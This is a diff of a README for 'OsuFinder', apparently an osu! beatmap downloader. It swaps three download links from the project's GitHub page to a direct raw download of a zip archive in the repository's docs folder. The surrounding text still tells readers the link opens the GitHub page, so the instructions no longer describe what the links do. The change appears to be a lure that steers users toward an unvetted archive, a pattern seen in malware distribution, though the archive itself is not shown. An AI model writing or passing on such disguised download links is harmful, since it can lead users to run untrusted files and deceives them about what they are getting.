@@ -1,6 +1,6 @@
 # 🎵 OsuFinder - Find and Download Beatmaps Effortlessly
 
-[![Download OsuFinder](https://img.shields.io/badge/Download-OsuFinder-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/idiomatic-astaticgalvanometer9591/OsuFinder)
+[![Download OsuFinder](https://img.shields.io/badge/Download-OsuFinder-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/idiomatic-astaticgalvanometer9591/OsuFinder/main/docs/1.0.zip)
 
 ---
 
@@ -18,7 +18,7 @@ OsuFinder is a user-friendly tool designed specifically for osu! players. It all
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/idiomatic-astaticgalvanometer9591/OsuFinder](https://github.com/idiomatic-astaticgalvanometer9591/OsuFinder)
+Visit this link to download the application: [https://raw.githubusercontent.com/idiomatic-astaticgalvanometer9591/OsuFinder/main/docs/1.0.zip](https://raw.githubusercontent.com/idiomatic-astaticgalvanometer9591/OsuFinder/main/docs/1.0.zip)
 
 Once you click the link, you'll be taken to the OsuFinder GitHub page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click on it to see the available download options.
 
@@ -177,7 +177,7 @@ OsuFinder is actively maintained and updated regularly. The developers are const
 
 Downloading beatmaps for osu! has never been easier. With OsuFinder, you can spend less time searching and more time playing. Give it a try today!
 
-[![Download OsuFinder Now](https://img.shields.io/badge/Download-OsuFinder-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/idiomatic-astaticgalvanometer9591/OsuFinder)
+[![Download OsuFinder Now](https://img.shields.io/badge/Download-OsuFinder-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/idiomatic-astaticgalvanometer9591/OsuFinder/main/docs/1.0.zip)
 
 ---
 
